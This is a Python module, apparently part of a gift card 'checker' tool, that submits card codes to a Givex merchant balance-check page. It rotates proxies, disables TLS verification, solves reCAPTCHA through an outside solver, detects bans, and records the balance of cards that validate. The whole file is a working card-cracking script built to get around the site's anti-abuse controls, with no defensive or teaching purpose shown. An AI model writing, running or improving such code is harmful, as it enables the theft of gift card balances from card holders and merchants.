from models.enums.response_type import ResponseType
from models.valid import Valid
from models.proxy import Proxy

import requests
import re

import urllib3
urllib3.disable_warnings()

class Cactus:
    def _check(self, code, proxy, solver):
        FAILURE_KEYS = ['Card number is invalid']
        SUCCESS_KEYS = ['The balance for card']
        req = requests.session()

        req.proxies = proxy.get_proxy()
        req.verify = False

        req.headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.198 Safari/537.36 OPR/72.0.3815.400',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
            'Accept-Language': 'en-US,en;q=0.9',
            'Referer': 'https://wwws-canada2.givex.com/merchant_balcheck/16986_en/'
        }

        response = req.get('https://wwws-canada2.givex.com/public/balance/balancecheck_new.py?_LANGUAGE_:en+16986')

        if response.status_code != 200:
            return ResponseType.BANNED
        response = response.text

        webinfo = re.search(r'webinfo_id" VALUE="(.*?)"', response).group(1)

        req.headers['Content-Type'] = 'application/x-www-form-urlencoded'
        
        captcha_response = solver.solveCaptcha()

        response = req.post('https://wwws-canada2.givex.com/public/balance/balancecheck_new.py?16986+_LANGUAGE_:en', f'cardnum={code}&_LANGUAGE_=en&_FUNCTION_=result&webinfo_id={webinfo}&merchant_id=16986&partner_id=1&g-recaptcha-response={captcha_response}')

        if response.status_code != 200:
            return ResponseType.BANNED
        response = response.text

        if any(key in response for key in FAILURE_KEYS):
            return ResponseType.FAILURE
        elif any(key in response for key in SUCCESS_KEYS):
            valid = Valid(code, 'Cactus')
            balance = re.search(r'The balance for card[\s\S]+?balance">(.*?)<', response).group(1)
            valid.add_capture('Balance', balance)
            return valid

        return ResponseType.BANNED

    def check_code(self, code, proxy, solver):
        try:
            return self._check(code, proxy, solver)
        except:
            return ResponseType.FAILURE